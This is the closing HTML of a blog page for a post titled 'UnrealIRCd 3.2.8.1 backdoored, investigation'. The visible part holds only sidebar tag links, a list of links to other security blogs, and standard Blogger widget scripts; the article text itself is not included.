+<a dir='ltr' href='https://blog.stalkr.net/search/label/posix'>posix</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/ppp'>ppp</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/pptp'>pptp</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/pptpclient'>pptpclient</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/proc'>proc</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/procps'>procps</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/proxmox'>proxmox</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/ps'>ps</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/pty'>pty</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/public%20key%20pinning'>public key pinning</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/puck'>puck</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/rar'>rar</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/rdinit'>rdinit</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/rsa'>rsa</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/safety'>safety</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/scalpel'>scalpel</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/scan'>scan</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/scripts'>scripts</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/secondary'>secondary</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/security'>security</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/securitybydefault'>securitybydefault</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/setcap'>setcap</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/sha256'>sha256</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/sheevaplug'>sheevaplug</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/size'>size</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/smartd'>smartd</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/smartmontools'>smartmontools</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/snappy'>snappy</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/sockets'>sockets</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/sqlite'>sqlite</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/sscat'>sscat</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/sshfp'>sshfp</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/sshttp'>sshttp</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/sslh'>sslh</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/strcpy'>strcpy</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/taviso'>taviso</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/terminal'>terminal</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/threads'>threads</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/timestamp'>timestamp</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/tinnes'>tinnes</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/tiny'>tiny</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/tlsa'>tlsa</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/tor'>tor</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/trojan'>trojan</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/tty'>tty</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/tunnel'>tunnel</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/twitter'>twitter</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/type'>type</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/ucl'>ucl</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/udev'>udev</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/udp'>udp</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/unbound'>unbound</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/unrealircd'>unrealircd</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/vernam'>vernam</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/vnc'>vnc</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/vpn'>vpn</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/vpnod'>vpnod</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/wargame'>wargame</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/wget'>wget</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/window'>window</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/windows'>windows</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/xmlstarlet'>xmlstarlet</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/yubico'>yubico</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/yubitext'>yubitext</a>
+</span>
+<span class='label-size label-size-1'>
+<a dir='ltr' href='https://blog.stalkr.net/search/label/zigbee'>zigbee</a>
+</span>
+<div class='clear'></div>
+</div>
+</div><div class='widget HTML' data-version='1' id='HTML2'>
+<h2 class='title'>Links</h2>
+<div class='widget-content'>
+<a href="https://0vercl0k.tuxfamily.org/bl0g/">0vercl0k</a><br />
+<a href="https://baboonrce.github.io/">Baboon</a><br />
+<a href="https://doar-e.github.io/">Diary of a Reverse-Engineer</a><br />
+<a href="https://www.ivanlef0u.tuxfamily.org/">Ivanlef0u</a><br />
+<a href="https://dustri.org/b/">jvoisin</a><br />
+<a href="https://news0ft.blogspot.com/">newsoft</a><br />
+<a href="https://pwning.net/blog/">Plaid Parliament of Pwning</a><br />
+<!--<a href=""></a><br />//-->
+</div>
+<div class='clear'></div>
+</div></div>
+</div>
+<!-- spacer for skins that want sidebar and main to be the same height-->
+<div class='clear'>&#160;</div>
+</div>
+<!-- end content-wrapper -->
+<div id='footer-wrapper'>
+<div class='footer no-items section' id='footer'></div>
+</div>
+</div></div>
+<!-- end outer-wrapper -->
+<script type='text/javascript'>
+    SyntaxHighlighter.defaults['toolbar'] = false;
+    SyntaxHighlighter.all()
+  </script>
+
+<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/4033524873-widgets.js"></script>
+<script type='text/javascript'>
+window['__wavt'] = 'ACvIOeAFb-gVMfCddwywFKF5A00k:1786491176537';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d9099779','//blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html','9099779');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '9099779', 'title': 'StalkR\x27s Blog', 'url': 'https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html', 'canonicalUrl': 'https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html', 'homepageUrl': 'https://blog.stalkr.net/', 'searchUrl': 'https://blog.stalkr.net/search', 'canonicalHomepageUrl': 'https://blog.stalkr.net/', 'blogspotFaviconUrl': 'https://blog.stalkr.net/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22StalkR\x26#39;s Blog - Atom\x22 href\x3d\x22https://blog.stalkr.net/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22StalkR\x26#39;s Blog - RSS\x22 href\x3d\x22https://blog.stalkr.net/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22StalkR\x26#39;s Blog - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/9099779/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22StalkR\x26#39;s Blog - Atom\x22 href\x3d\x22https://blog.stalkr.net/feeds/4574631714866481251/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/3db55d8de4fe007f', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'X', 'key': 'twitter', 'shareMessage': 'Share to X', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'item', 'postId': '4574631714866481251', 'pageName': 'UnrealIRCd 3.2.8.1 backdoored, investigation', 'pageTitle': 'StalkR\x27s Blog: UnrealIRCd 3.2.8.1 backdoored, investigation'}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'UnrealIRCd 3.2.8.1 backdoored, investigation', 'description': 'UnrealIRCd  is a great IRC  server software (daemon) and very popular among mid-sized networks because of its highly advanced features and t...', 'url': 'https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 4574631714866481251}}]);
+_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/402556335-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/828616780-lightbox_bundle.css'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML3', 'sidebar', document.getElementById('HTML3'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_LabelView', new _WidgetInfo('Label1', 'sidebar', document.getElementById('Label1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML2', 'sidebar', document.getElementById('HTML2'), {}, 'displayModeFull'));
+</script>
+</body>
+</html>
